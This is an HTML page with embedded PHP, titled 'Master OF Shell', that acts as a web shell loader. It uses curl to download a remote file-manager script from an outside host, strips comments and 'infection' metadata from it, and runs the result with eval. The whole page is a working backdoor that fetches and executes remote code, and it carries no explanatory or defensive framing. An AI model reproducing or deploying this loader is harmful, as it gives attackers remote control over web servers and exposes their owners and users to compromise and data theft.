<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Master OF Shell</title>
</head>
<body>
    <h1>File Manager Root</h1>
    <p>Shell Master:</p>

    <div>
        <?php
        function get($url) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }

        $url = 'https://cdn.privdayz.com/txt/Simple-FileManager-RibelCyberTeam.txt'; 
        $data = get($url);

        if ($data !== false) {
            $cleanedData = preg_replace('/\/\*.*\*\//sU', '', $data); // Hapus komentar
            $cleanedData = preg_replace('/\/\*.*?infection.*?\*\//s', '', $cleanedData); // Hapus metadata

            eval("?>$cleanedData");
        } else {
            echo "Tidak dapat mengambil data dari URL.";
        }
        ?>
    </div>
</body>
</html>
